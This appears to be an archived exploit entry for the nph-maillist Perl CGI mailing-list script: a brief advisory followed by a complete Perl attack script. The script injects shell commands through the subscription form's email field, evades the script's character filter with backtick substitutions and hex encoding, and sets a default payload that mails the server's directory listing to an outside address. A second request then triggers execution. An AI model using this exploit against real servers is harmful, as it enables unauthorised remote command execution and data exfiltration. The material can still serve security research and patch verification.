source: http://www.securityfocus.com/bid/2563/info

nph-maillist is a Perl CGI script that handles mailing lists, typically used to notify interested users of site updates. A hostile user can enter commands embedded in an email address via the subscription form, and then force a mailing which will execute the commands. 

#!/usr/bin/perl
# nph-maillist hack... Kanedaaa  [ kaneda@ac.pl ]
# its add crazy @email, sends mails, and execute our code of coz ;]
#
# greetzzz to all of Bohatery... [Breslau Kilerz, Lam3rz, my Mom, dog,
# hamster... maybe this is not hamster..., wine, SobiechOS, wine, Cucumber
# Team Members... yeah. i must go sleep. ;]
# and #phreakpl, #hackingpl :]
#
# . remember thats just simple sploit... You cant play in koules this.. ;]
use Socket;

# Ip...
$ip="127.0.0.1";

# Command to run ...
$command = 'ls -al|mail ssie@bigbrother.pl';

#################################################
if (!$ARGV[0]) {
print "....nph-maillist hack... Kanedaaa  [kaneda\@ac.pl]\n";
print ".........Use the force, edit source...[ ip & command ]\n";
print "\n";
print "1:./nph-maillist-ogorek.pl send - add our special \@email to the list.\n";
print "2:./nph-maillist-ogorek.pl hack - sends emails from list and execute our code.\n";
}

if ($ARGV[0] eq "send") { &send }
if ($ARGV[0] eq "hack") { &hack }


sub send
{
###########################################
# You cant add this BAD chars... but we can hack this ;]
#" "	")"	"("	":"	"/"	"\"	"http:"
###########################################
# Hack the "/" problem... change "/" -> `head -n1 nph-maillist.pl|cut -c3`
#
$command =~ s/\//`head -n1 nph-maillist.pl|cut -c3`/g;
#
# Hack the ":" problem... change ":" -> `grep ntent-type nph-maillist.pl|tail -n1|awk -F "type" {'print $2'}|cut -c1`
#
$command =~ s/:/`grep ntent-type nph-maillist.pl|tail -n1|awk -F "type" {'print \$2'}|cut -c1`/g;
#
# Hack the "\" problem... change "\" -> `grep BGCOLOR nph-maillist.pl|tail -n1|awk -F "=" {'print \$2'}|cut -c1`
#
$command =~ s/\\/`grep BGCOLOR nph-maillist.pl|tail -n1|awk -F "=" {'print \$2'}|cut -c1`/g;
#
# Hack the "(" problem... change "(" -> `grep scalar nph-maillist.pl|tail -n1|awk -F "scalar" {'print \$2'}|cut -c1`
#
$command =~ s/\(/`grep scalar nph-maillist.pl|tail -n1|awk -F "scalar" {'print \$2'}|cut -c1`/g;
#
# Hack the ")" problem... change ")" -> `grep unlink nph-maillist.pl|awk -F "jobx" {'print \$2'}|cut -c1`
#
$command =~ s/\)/`grep unlink nph-maillist.pl|awk -F "jobx" {'print \$2'}|cut -c1`/g;


###
# Change ascii to hex...
$command =~ s/([^\w\!*-])/sprintf("%%%02X",ord($1))/ge;
#
# Hack the " " problem... change " " -> "\t" [TAB]
$command =~ s/%20/%09/g;

$r = int(rand(100000));
$command = "$r\@bigbrother.pl;".$command;

$parms="emailaddress=$command";
$tosend="GET /cgi-bin/nph-maillist.pl?$parms HTTP/1.0\r\n".
"Referer: http://$ip/cgi-bin/nph-maillist.pl\r\n\r\n";

print sendraw($tosend);

print "If server return some ...adding %trash% to the email list...\n";
print "Now run with hack parametr...Peace\n";
}

sub hack
{
$tosend="GET /cgi-bin/mailengine.pl HTTP/1.0\r\n".
"Referer: http://$ip/cgi-bin/nph-maillist.pl\r\n\r\n";

print sendraw($tosend);

print "... Theoretical You are haker... \n";

}

#####################################################
# Ripped from some RFP code... :]]  I will infuse good Tea for You...
# I`am the best Infuser of Tea in .pl ... :]
sub sendraw {
        my ($pstr)=@_; my $target;
        $target= inet_aton($ip) || die("inet_aton problems");
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                select(S);              $|=1;
                print $pstr;            my @in=<S>;
                select(STDOUT);         close(S);
                return @in;
        } else { die("Can't connect...\n"); }}

